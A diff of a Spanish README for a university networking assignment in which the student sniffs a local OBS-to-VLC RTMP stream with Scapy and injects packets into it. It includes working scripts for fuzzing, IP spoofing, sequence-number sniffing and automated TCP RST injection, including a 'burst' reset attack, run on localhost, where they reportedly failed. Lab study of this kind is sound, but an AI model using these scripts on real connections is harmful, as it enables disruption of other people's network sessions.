@@ -1,9 +1,9 @@
-# Proyecto: Servidor RTMP Local con OBS y VLC
+#  Proyecto: Inyección y Análisis de Tráfico RTMP con Scapy (Tarea 3)
 
- 
-Este proyecto implementa un sistema de transmisión de video en tiempo real (RTMP) completamente local utilizando Docker, OBS Studio como emisor y VLC como receptor. Se utilizó Wireshark para capturar el tráfico de red y analizar los paquetes RTMP.
+Este proyecto corresponde a la Tarea 3 del curso Taller de Redes y Servicios, y tiene como objetivo analizar e intervenir el tráfico de red RTMP generado por una transmisión local entre OBS Studio (emisor) y VLC (receptor) utilizando Scapy dentro de un contenedor Docker especializado.
 
-Demostración en vivo: No aplica (sistema local)
+En esta entrega se explora la manipulación directa del protocolo RTMP a través de la captura, análisis e inyección de paquetes TCP, incluyendo pruebas de fuzzing, spoofing y finalización de conexión mediante flags RST.
+
 
 ---
 
@@ -12,9 +12,9 @@ Demostración en vivo: No aplica (sistema local)
 - [Información general](#información-general)
 - [Tecnologías utilizadas](#tecnologías-utilizadas)
 - [Características](#características)
-- [Capturas de pantalla](#capturas-de-pantalla)
 - [Configuración](#configuración)
-- [Uso](#uso)
+- [Pruebas Realizadas](#pruebas-realizadas)
+- [Resultados](#resultados)
 - [Estado del proyecto](#estado-del-proyecto)
 - [Margen de mejora](#margen-de-mejora)
 - [Expresiones de gratitud](#expresiones-de-gratitud)
@@ -24,7 +24,8 @@ Demostración en vivo: No aplica (sistema local)
 
 ## Información general
 
-Este proyecto busca implementar un flujo de transmisión RTMP desde un cliente emisor (OBS Studio) a un servidor personalizado alojado en Docker, y visualizar el contenido desde un cliente receptor (VLC), todo ejecutado en una misma máquina (localhost).
+Este proyecto busca interceptar y modificar tráfico de red RTMP utilizando Scapy en un entorno aislado. La finalidad es explorar conceptos de seguridad, manipulación de paquetes TCP y respuesta de aplicaciones reales (OBS/VLC) frente a paquetes inyectados fuera de contexto.
+
 
 Se desarrolló como parte de una tarea académica en el área de redes y servicios.
 
@@ -34,14 +35,17 @@ Objetivos:
 - Emitir en tiempo real desde OBS
 - Recibir el stream con VLC
 - Capturar y analizar los paquetes en Wireshark
+- Intersectar el trafico con scapy
+- Parar la trasmision con scapy
 
 ---
 
 ## Tecnologías utilizadas
 
 - Ubuntu 22.04
-- Docker 24.0+
-- Node.js 18.x (con CoffeeScript)
+- Docker 24+
+- Python 3.11
+- Scapy
 - OBS Studio
 - VLC Media Player
 - Wireshark
@@ -50,94 +54,194 @@ Objetivos:
 
 ##  Características
 
-- Transmisión RTMP en tiempo real
-- Configuración completamente local (no requiere internet)
-- Análisis de tráfico TCP/RTMP en Wireshark
-- Contenedor Docker totalmente funcional
-- Configuración reproducible paso a paso
+- Entorno experimental reproducible
+- Captura en vivo de paquetes RTMP (puerto 1935)
+- Scripts de inyección TCP con Scapy
+- Fuzzing (payloads malformados)
+- Spoofing (direcciones IP falsas)
+- Intentos de cierre de conexión (RST)
+- Observación de efectos en OBS y VLC
 
 ---
 
-## Capturas de pantalla
-
-OBS configurado como emisor RTMP:  
-![OBS Studio](OBS.png)
-
-VLC recibiendo el stream:  
-![VLC](obs-vlc.png)
-
-Wireshark mostrando tráfico RTMP:  
-![Wireshark](captura2.png)
-
----
 
 ## Configuración
 
-Requisitos:
-
-- Docker y Docker Compose instalados
-- Flatpak (para instalar OBS)
-- git
-- VLC Media Player
-- Wireshark
-
-Configuración local:
+1. Crear contenedor Debian con permisos de red:
 
 ```bash
-git clone https://github.com/iizukanao/node-rtsp-rtmp-server.git
-mkdir -p ~/rtmp-project/rtmp-server
-mv node-rtsp-rtmp-server ~/rtmp-project/rtmp-server/
-cd ~/rtmp-project
+docker run -it --net=host --cap-add=NET_ADMIN --name scapy-container debian bash
 ```
-Crear archivo docker-compose.yml:
+2. Instalar dependencias dentro del contenedor:
 ```bash
-version: '3'
-services:
-  rtmp-server:
-    build: ./rtmp-server
-    ports:
-      - "1935:1935"
-    container_name: rtmp-server
-```
-Crear Dockerfile dentro de rtmp-server:
+apt update
+apt install -y python3 python3-pip python3-venv nano net-tools
+python3 -m venv /opt/scapy-venv
+source /opt/scapy-venv/bin/activate
+pip install --upgrade pip setuptools
+pip install scapy
 
+```
+Scripts Implementados:
+-sniffer.py
 ```bash
-FROM node:18
-RUN apt-get update && apt-get install -y coffeescript
-WORKDIR /app
-COPY node-rtsp-rtmp-server /app
-RUN npm install
-RUN chmod +x start_server.sh
-EXPOSE 1935
-CMD ["sh", "start_server.sh"]
+from scapy.all import *
+
+def ver(pkt):
+    if pkt.haslayer(TCP) and pkt[IP].dst == "127.0.0.1" and pkt[TCP].dport == 1935:
+        print(pkt.summary())
+
+sniff(iface="lo", filter="tcp port 1935", prn=ver)
+
 ```
-Editar start_server.sh para eliminar sudo en coffee server.coffee.
+- sniff_seq.py
+```
+from scapy.all import *
 
-## Uso
-1. Iniciar el servidor RTMP:
-```bash
+def capturar(pkt):
+    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
+        print("Puerto OBS:", pkt[TCP].sport)
+        print("Secuencia:", pkt[TCP].seq)
+        pkt.show()
+        return True
 
-cd ~/rtmp-project
-docker compose up --build
+sniff(filter="tcp and port 1935", prn=capturar, count=1)
+
 ```
 
-
-2.En OBS Studio:
-
-- Servidor: ```rtmp://localhost/live```
-
-- Clave: stream
-
-3. En VLC:
-- Abrir ubicación de red:
-```rtmp://localhost/live/stream```
+- fuzz1.py
 
 
-4. Para ver el tráfico en Wireshark:
+```
+from scapy.all import *
 
-- Interfaz: lo
+pkt = IP(dst="127.0.0.1")/TCP(dport=1935, flags="FPU")/Raw(load="fuzzing-test-1")
+send(pkt)
 
-- Filtro: tcp.port == 1935
+```
+
+- fuzz2.py
+
+
+```
+from scapy.all import *
+
+for i in range(100):
+    pkt = IP(dst="127.0.0.1")/TCP(dport=1935)/Raw(load="X"*2048)
+    send(pkt)
+
+```
+- mod1_rst_real.py
+
+```
+from scapy.all import *
+
+ip = IP(src="127.0.0.1", dst="127.0.0.1")
+tcp = TCP(sport=46404, dport=1935, flags="R", seq=123456789)  # Reemplazar seq
+pkt = ip/tcp
+
+send(pkt)
+print("Paquete RST enviado.")
+
+```
+- mod1_auto.py
+```
+from scapy.all import *
+
+print("Escuchando un paquete válido desde OBS hacia el servidor RTMP...")
+
+def capturar(pkt):
+    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
+        src_ip = pkt[IP].src
+        dst_ip = pkt[IP].dst
+        sport = pkt[TCP].sport
+        dport = pkt[TCP].dport
+        seq = pkt[TCP].seq + 1
+
+        print(f" Paquete capturado: {src_ip}:{sport} → {dst_ip}:{dport}, seq={seq}")
+        ip = IP(src=src_ip, dst=dst_ip)
+        tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
+        send(ip/tcp)
+        print(" Paquete RST enviado con éxito.")
+        return True
+
+sniff(filter="tcp and port 1935", prn=capturar, count=1)
+
+```
+
+- mod1_burst.py
+
+
+```
+from scapy.all import *
+
+print(" Buscando paquete OBS → nginx para lanzar ataque burst RST...")
+
+def capturar(pkt):
+    if pkt.haslayer(TCP) and pkt[IP].dst == "172.18.0.2" and pkt[TCP].dport == 1935:
+        src_ip = pkt[IP].src
+        dst_ip = pkt[IP].dst
+        sport = pkt[TCP].sport
+        dport = pkt[TCP].dport
+        base_seq = pkt[TCP].seq
+
+        for offset in range(20):
+            seq = base_seq + offset
+            ip = IP(src=src_ip, dst=dst_ip)
+            tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
+            send(ip/tcp, verbose=0)
+
+        print(" Ataque RST burst enviado.")
+        return True
+
+sniff(filter="tcp and dst port 1935", prn=capturar, count=1)
+
+```
+- mod2_spoof.py
+
+
+```
+from scapy.all import *
+
+pkt = IP(src="10.10.10.10", dst="127.0.0.1")/TCP(dport=1935)/Raw(load="spoofed")
+send(pkt)
+
+```
+- mod3_seq.py
+
+```
+from scapy.all import *
+
+pkt = IP(dst="127.0.0.1")/TCP(dport=1935, seq=999999)/Raw(load="bad-seq")
+send(pkt)
+
+```
+##  Pruebas Realizadas
+
+- Captura de paquetes RTMP
+
+- Spoofing de IP
+
+- Fuzzing de payloads
+
+- Inyección de paquetes RST
+
+- Ataque en ráfaga de RSTs (burst)
+
+- Observación en Wireshark y netstat
+
+
+## Resultados
+
+- Todos los paquetes fueron enviados correctamente.
+
+- Nginx (contenedor) no aceptó los RSTs externos.
+
+- La transmisión RTMP continuó estable (OBS y VLC sin interrupción).
+
+Conclusión: El entorno experimental funcionó correctamente, pero el cierre de conexión fue bloqueado por la lógica de red del sistema (docker-proxy, kernel TCP stack, etc.).
+
+
 
 ## Estado del proyecto
 
@@ -145,22 +249,21 @@ El proyecto está: Finalizado
 
 ## Margen de mejora
 
-Áreas por mejorar:
-- Añadir interfaz web para control de la transmisión
-- Incluir autenticación RTMP
-- Configurar múltiples streams simultáneos
 
-Tareas pendientes:
- - Agregar logging al servidor RTMP
- - Exportar estadísticas de tráfico
- - Crear imagen Docker personalizada pública
+- Probar ataques en red real (no solo localhost)
+
+- Automatizar todo en un menú interactivo
+
+- Recolectar métricas del servidor
+
+- Generar logs y estadísticas
 
 ## Expresiones de gratitud
 
 - Este proyecto se inspiró en el repositorio:
 ```https://github.com/iizukanao/node-rtsp-rtmp-server```
 
-- Gracias a OBS Studio y VLC por ser herramientas libres
+- Gracias a OBS, VLC, Wireshark y Scapy.
 
 - Agradecimientos a mi equipo docente y compañeros
 
